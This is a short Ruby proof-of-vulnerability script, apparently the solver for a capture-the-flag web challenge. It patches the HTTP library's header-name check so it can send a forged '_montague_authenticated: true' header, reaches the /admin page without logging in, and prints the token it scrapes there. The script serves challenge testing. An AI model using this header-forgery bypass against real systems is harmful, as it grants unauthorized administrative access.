#!/bin/env ruby

require "logger"

require "http"
require "nokogiri"

LLL = Logger.new(STDERR,
                 formatter: proc do |sev, datetime, progname, msg|
                   "#{sev}: #{msg}\n"
                 end)

module HTTP
  class Headers
    CANONICAL_NAME_RE = //
  end
end

class Pov
  attr_reader :host, :port


  def initialize
    @host = ENV['HOST'] || 'challenge'
    @port = ENV['PORT'] || '3013'
  end

  def run!
    resp = client.headers('_montague_authenticated' => 'true').get("/admin")
    assert(200 == resp.status)
    doc = Nokogiri::HTML(resp.body.to_s)
    token = doc.css('#token').text
    if token.empty?
      LLL.info resp.body.to_s
      LLL.fatal "couldn't find token"
      exit -1
    end
    $stdout.puts "TOKEN=#{token}"
  end

  private
  def client
    return @client if defined? @client

    @client = HTTP.persistent "http://#{@host}:#{@port}"
  end

  def assert_equal(expected, actual)
    assert(expected == actual, "expected #{expected} to == #{actual}")
  end

  def assert(predicate, message='failed assertion')
    return if predicate
    fail message
  end
end

pov = Pov.new
at_exit do
  LLL.info((["ruby", $0] + ARGV).join(' '))
end
pov.run!

LLL.info "success :)"
